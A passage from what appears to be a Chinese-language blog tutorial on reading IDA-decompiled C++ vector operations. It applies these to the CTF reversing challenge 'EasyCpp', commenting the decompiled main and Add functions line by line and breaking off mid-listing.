class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// rax</span></span><br><span class="line">  __int64 v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 v5; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+Ch] [rbp-64h]</span></span><br><span class="line">  <span class="keyword">char</span> v9; <span class="comment">// [rsp+10h] [rbp-60h]</span></span><br><span class="line">  <span class="keyword">char</span> v10; <span class="comment">// [rsp+30h] [rbp-40h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+54h] [rbp-1Ch]</span></span><br><span class="line">  <span class="keyword">char</span> v12; <span class="comment">// [rsp+5Bh] [rbp-15h]</span></span><br><span class="line">  <span class="keyword">int</span> v13; <span class="comment">// [rsp+5Ch] [rbp-14h]</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">//用上一节的知识，这里创建了一个vector</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v10, argv, envp);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">4</span>; ++i )</span><br><span class="line">  <span class="comment">//这里相当于v10.push_back(i)</span></span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v10, &amp;i);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//求v10的大小，相当于v3 = v10.size();</span></span><br><span class="line">  v3 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::size(&amp;v10);</span><br><span class="line">  <span class="comment">//相当于cout&lt;&lt;v3;</span></span><br><span class="line">  <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, v3);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//相当于v10.pop_back();</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::pop_back(&amp;v10);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//相当于if(!v10.empty())</span></span><br><span class="line">  <span class="comment">//        v10.pop_back();</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::empty(&amp;v10) ^ <span class="number">1</span> )</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::pop_back(&amp;v10);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这个resize有没有发觉很像上一节的构造函数，第一个参数为一个char变量的地址，第二个为容器初始大小，第三个为初始数据的地址</span></span><br><span class="line">  <span class="comment">//相当于v10.resize(5,2);</span></span><br><span class="line">  v11 = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::resize(&amp;v10, <span class="number">5L</span>L, &amp;v11);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这里就是上一节的那个构造函数了，相当于vector&lt;int&gt;v9(5,2);</span></span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::allocator(&amp;v12);</span><br><span class="line">  v13 = <span class="number">2</span>;</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v9, <span class="number">5L</span>L, &amp;v13, &amp;v12);</span><br><span class="line">  <span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;::~allocator(&amp;v12);</span><br><span class="line">  <span class="comment">//这里判断两个容器是否相等,相当于v9 == v10</span></span><br><span class="line">  <span class="keyword">if</span> ( (<span class="keyword">unsigned</span> __int8)<span class="built_in">std</span>::<span class="keyword">operator</span>==&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;(&amp;v9, &amp;v10) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = <span class="built_in">std</span>::<span class="keyword">operator</span>&lt;&lt;&lt;<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, <span class="string">"Right!"</span>);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(v4, &amp;<span class="built_in">std</span>::<span class="built_in">endl</span>&lt;<span class="keyword">char</span>,<span class="built_in">std</span>::char_traits&lt;<span class="keyword">char</span>&gt;&gt;);</span><br><span class="line">  &#125;</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//这两句又出现了吧，end跟begin，这几句很常用，能识别就行</span></span><br><span class="line">  v5 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v10);</span><br><span class="line">  v6 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v10);</span><br><span class="line"></span><br><span class="line">  <span class="comment">//将下面句子简化可以看出他就是v9.assign(v6,v5);</span></span><br><span class="line">  <span class="comment">//其实就是v9.assign(v10.begin(), v10.end());</span></span><br><span class="line">  <span class="comment">//具体怎么简化的话，你就看::，不要看模板，那只是类型的问题</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::assign&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="keyword">void</span>&gt;(</span><br><span class="line">    &amp;v9,</span><br><span class="line">    v6,</span><br><span class="line">    v5);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//清空容器元素，相当于v10.clear();</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::clear(&amp;v10);</span><br><span class="line">  getchar();</span><br><span class="line"></span><br><span class="line">  <span class="comment">//析构函数</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v9);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v10);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>小结：</strong></p><ul><li>c++ vector的逆向其实不难，最主要你要耐心去看，如果你看多几次，你会发觉这个不难，也就是基本操作而已</li><li>具体的重要步骤详解，我都在上面注释写的很清楚，一一对应，你可以根据getchar一个个对应去看，看多几遍就知道了</li><li>要学会简化ida识别的代码，不要盯着模板一直在那看</li></ul><p>好了，vector的基本操作完了，接下来拿一道题来实战吧。我相信各位的技术，接下来直接上代码你们也是可以看懂了，看不懂就往上面翻一翻，查下基本操作</p><h1 id="西湖论剑之EasyCpp"><a href="#西湖论剑之EasyCpp" class="headerlink" title="西湖论剑之EasyCpp"></a>西湖论剑之EasyCpp</h1><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> v3; <span class="comment">// r15</span></span><br><span class="line">  __int64 v4; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v5; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v6; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v7; <span class="comment">// rdx</span></span><br><span class="line">  __int64 r12_7; <span class="comment">// r12</span></span><br><span class="line">  __int64 v8; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v9; <span class="comment">// rax</span></span><br><span class="line">  __int64 v11; <span class="comment">// rdx</span></span><br><span class="line">  __int64 v12; <span class="comment">// rbx</span></span><br><span class="line">  __int64 v13; <span class="comment">// rax</span></span><br><span class="line">  __int64 v14; <span class="comment">// r8</span></span><br><span class="line">  __int64 v15; <span class="comment">// r9</span></span><br><span class="line">  __int64 v16; <span class="comment">// rbx</span></span><br><span class="line">  <span class="keyword">char</span> v17; <span class="comment">// al</span></span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> *v18; <span class="comment">// rax</span></span><br><span class="line">  <span class="keyword">const</span> <span class="keyword">char</span> **v20; <span class="comment">// [rsp+0h] [rbp-190h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-174h]</span></span><br><span class="line">  <span class="keyword">signed</span> <span class="keyword">int</span> j; <span class="comment">// [rsp+20h] [rbp-170h]</span></span><br><span class="line">  <span class="keyword">char</span> v23; <span class="comment">// [rsp+30h] [rbp-160h]</span></span><br><span class="line">  <span class="keyword">char</span> v24; <span class="comment">// [rsp+50h] [rbp-140h]</span></span><br><span class="line">  <span class="keyword">char</span> v25; <span class="comment">// [rsp+70h] [rbp-120h]</span></span><br><span class="line">  <span class="keyword">char</span> v26; <span class="comment">// [rsp+90h] [rbp-100h]</span></span><br><span class="line">  <span class="keyword">char</span> v27; <span class="comment">// [rsp+B0h] [rbp-E0h]</span></span><br><span class="line">  __int64 v28; <span class="comment">// [rsp+D0h] [rbp-C0h]</span></span><br><span class="line">  __int64 v29; <span class="comment">// [rsp+F0h] [rbp-A0h]</span></span><br><span class="line">  <span class="keyword">int</span> v30[<span class="number">18</span>]; <span class="comment">// [rsp+110h] [rbp-80h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v31; <span class="comment">// [rsp+158h] [rbp-38h]</span></span><br><span class="line"></span><br><span class="line">  v20 = argv;</span><br><span class="line">  v31 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v23, argv, envp);<span class="comment">// #定义五个容器，相当于vector&lt;int&gt; v23,v24,v25,v26,v27</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v24, argv, v4);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v25, argv, v5);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v26, argv, v6);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v27, argv, v7);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">scanf</span>(<span class="string">"%d"</span>, &amp;v30[i], v20);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v24, &amp;v30[i]);<span class="comment">// 相当于v24.push_back(v30[i]);</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( j = <span class="number">0</span>; j &lt;= <span class="number">15</span>; ++j )</span><br><span class="line">  &#123;</span><br><span class="line">    LODWORD(v29) = fib(j);</span><br><span class="line">    <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v23, &amp;v29);<span class="comment">// 相当于v23.push_back(fib(j)) ;   j从0-15</span></span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::push_back(&amp;v25, v30);<span class="comment">// 相当于v25.push_back(v30[0]);  </span></span><br><span class="line"></span><br><span class="line">  r12_7 = <span class="built_in">std</span>::back_inserter&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v25);<span class="comment">// back_inserter创建一个容器指针，指向v25</span></span><br><span class="line"></span><br><span class="line">  v8 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v24);<span class="comment">// v8 = v24.end()</span></span><br><span class="line">  v29 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v24);<span class="comment">// v29 = v24.begin();</span></span><br><span class="line"></span><br><span class="line">  v9 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>+(&amp;v29, <span class="number">1L</span>L);<span class="comment">// 传v29的地址，在里面在用指针，相当于传了v24.begin(),这个操作过后就是相当于v9 = v24.begin() + 4;这里我所说的这种说法有语法错误，因为v24.begin()是迭代器，不能这么加，我说的是地址</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  Add(</span><br><span class="line">    v9,                                         <span class="comment">// v24.begin()+4 相当于数组第二个数</span></span><br><span class="line">    v8,                                         <span class="comment">// v24.end() 相当于数组最后一个数</span></span><br><span class="line">    r12_7,                                      <span class="comment">// 只有输入的第一个元素的容器</span></span><br><span class="line">    v30);                                       <span class="comment">// 输入的第一个元素的元素的值</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="built_in">vector</span>(&amp;v28, v8, v11);<span class="comment">// 创建一个新容器 vector&lt;int&gt; v28</span></span><br><span class="line"></span><br><span class="line">  v12 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v25);<span class="comment">// v12 = v25.end();</span></span><br><span class="line">  v13 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v25);<span class="comment">// v13 = v25.begin();</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::accumulate&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,main::&#123;lambda(<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;,<span class="keyword">int</span>)#<span class="number">2</span>&#125;&gt;(</span><br><span class="line">    &amp;v29,</span><br><span class="line">    v13,</span><br><span class="line">    v12,</span><br><span class="line">    &amp;v28,</span><br><span class="line">    v14,</span><br><span class="line">    v15,</span><br><span class="line">    v3);                                        <span class="comment">// //倒置函数</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::<span class="keyword">operator</span>=(&amp;v26, &amp;v29);<span class="comment">//将容器v29赋值给v26</span></span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v29);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v28);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> ( <span class="built_in">std</span>::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;(&amp;v26, &amp;v23) )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"You failed!"</span>);</span><br><span class="line">    <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::back_inserter&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v27);</span><br><span class="line">  v16 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v24);</span><br><span class="line">  v17 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v24);</span><br><span class="line"></span><br><span class="line">  <span class="built_in">std</span>::copy_if&lt;__gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,<span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;,main::&#123;lambda(<span class="keyword">int</span>)#<span class="number">3</span>&#125;&gt;(v17);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"You win!"</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Your flag is:flag&#123;"</span>, v16, v20);</span><br><span class="line">  v28 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::begin(&amp;v27);</span><br><span class="line">  v29 = <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::end(&amp;v27);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> ( __gnu_cxx::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v28, &amp;v29) )</span><br><span class="line">  &#123;</span><br><span class="line">    v18 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v28);</span><br><span class="line">    <span class="built_in">std</span>::ostream::<span class="keyword">operator</span>&lt;&lt;(&amp;<span class="built_in">std</span>::<span class="built_in">cout</span>, *v18);</span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>++(&amp;v28);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="built_in">putchar</span>(<span class="number">125</span>);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v27);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v26);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v25);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v24);</span><br><span class="line">  <span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;::~<span class="built_in">vector</span>(&amp;v23);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>我的注释部分只写到了获得正确flag的过程部分，也就是前半部分，后面部分其实也不难，你们可以作为练习分析下，<br>下面根据这里面的难点和重点进行具体分析，整个过程最难的部分就是Add和accumulate,这两部分是重点，如果不理解这两部分是无法得到正确的flag的</p><p>我先对Add附近的进行分析</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">v9 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>+(&amp;v29, <span class="number">1L</span>L);<span class="comment">// 传v29的地址，在里面在用指针，相当于传了v24.begin(),这个操作过后就是相当于v9 = v24.begin() + 1;</span></span><br></pre></td></tr></table></figure><p>这句我原来以为是将v29+1，后面才发觉这是取容器v29的第一个元素，如果这里看不懂的话，可以跟进去看看，双击这行</p><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __fastcall __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>+(_QWORD *v24, __int64 num)</span><br><span class="line">&#123;</span><br><span class="line">  __int64 v3; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  __int64 v4; <span class="comment">// [rsp+20h] [rbp-10h]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = <span class="number">4</span> * num + *v24;</span><br><span class="line">  __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::__normal_iterator(&amp;v4, &amp;v3);<span class="comment">// 相当于v4 = v3</span></span><br><span class="line">  <span class="keyword">return</span> v4;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><ul><li><p>进行的是这个，他传入的是num,作为偏移，他取出来的是容器的第1个元素，我以下标为0为第一个元素，以后不在赘述</p></li><li><p>4*num + *24 这种写法很常见，在ida6.8尤其显著</p></li><li><p>他将int数组识别为char数组，取值的时候通常也是这样取，假设有个int数组 int num[5] = {1,2,3,4,5}; 在ida6.8里他识别为char num[20]; 取值的时候就num[4*i]，i是循环里的循环变量</p></li></ul><h3 id="接下来是Add部分"><a href="#接下来是Add部分" class="headerlink" title="接下来是Add部分"></a>接下来是Add部分</h3><figure class="highlight c++"><table><tr><td class="code"><pre><span class="line">__int64 __<span class="function">fastcall <span class="title">Add</span><span class="params">(__int64 &amp;num[<span class="number">1</span>], __int64 &amp;num[n], __int64 p, __int64 &amp;num[<span class="number">0</span>])</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">int</span> *v4; <span class="comment">// rax</span></span><br><span class="line">  __int64 *v5; <span class="comment">// rax</span></span><br><span class="line">  __int64 v7; <span class="comment">// [rsp+0h] [rbp-30h]</span></span><br><span class="line">  __int64 v8; <span class="comment">// [rsp+8h] [rbp-28h]</span></span><br><span class="line">  __int64 v9; <span class="comment">// [rsp+10h] [rbp-20h]</span></span><br><span class="line">  __int64 v10; <span class="comment">// [rsp+18h] [rbp-18h]</span></span><br><span class="line">  <span class="keyword">int</span> v11; <span class="comment">// [rsp+24h] [rbp-Ch]</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v12; <span class="comment">// [rsp+28h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v10 = &amp;num[<span class="number">1</span>];                                <span class="comment">// 这里说明下，都是地址</span></span><br><span class="line">  v9 = &amp;num[n];</span><br><span class="line">  v8 = p;</span><br><span class="line">  v7 = &amp;num[<span class="number">0</span>];</span><br><span class="line">  v12 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  <span class="keyword">while</span> ( __gnu_cxx::<span class="keyword">operator</span>!=&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;(&amp;v10, &amp;v9) )</span><br><span class="line">  &#123;</span><br><span class="line">    v4 = __gnu_cxx::__normal_iterator&lt;<span class="keyword">int</span> *,<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v10);<span class="comment">// v4 = v10</span></span><br><span class="line">    v11 = main::&#123;lambda(<span class="keyword">int</span>)#<span class="number">1</span>&#125;::<span class="keyword">operator</span>() <span class="keyword">const</span>(&amp;v7, *v4);<span class="comment">// 点进去后发现就是num[0] + *v10</span></span><br><span class="line">    v5 = <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>*(&amp;v8);<span class="comment">// v5 = &amp;v8</span></span><br><span class="line">    <span class="built_in">std</span>::back_insert_iterator&lt;<span class="built_in">std</span>::<span class="built_in">vector</span>&lt;<span class="keyword">int</span>,<span class="built_in">std</span>::allocator&lt;<span class="keyword">int</span>&gt;&gt;&gt;::<span class="keyword">operator</span>=(v5, &amp;v11);<span class="comment">// 将结果存到v5里去，v5指向result容器</span></span><br><span class="line">    __gnu_cxx::__normal_iterator&lt;<span 